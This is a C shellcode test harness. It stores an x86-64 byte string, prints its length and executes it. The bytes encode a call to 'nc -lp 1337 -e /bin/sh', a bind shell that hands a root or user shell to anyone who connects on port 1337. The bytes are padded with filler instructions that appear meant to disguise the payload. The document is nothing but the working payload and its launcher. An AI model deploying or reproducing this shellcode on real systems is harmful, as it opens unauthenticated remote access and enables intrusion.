#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\xfe\xc0\xfe\xc1\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\xf9\x51\x90\x90\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\xc0\xe8\x02\x48\xc1\xeb\x30\x99\x90\xf5\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x41\x57\x41\x5e\x41\x57\x41\x5e\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d\x6c\x49\xc1\xe8\x30\x48\xc1\xc5\x3b\x49\xc1\xce\x3c\x49\xc1\xed\x08\x41\x50\x49\x89\xe0\x52\x51\x53\x41\x52\x90\xf9\x4c\x8d\xa4\x24\x01\xff\xff\xff\x90\xfc\x90\x41\x51\x41\x50\x57\x48\x89\xe6\xf9\xf5\x54\x41\x5e\x41\x57\x58\xb0\x0c\x04\x2f\x0f\x05"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

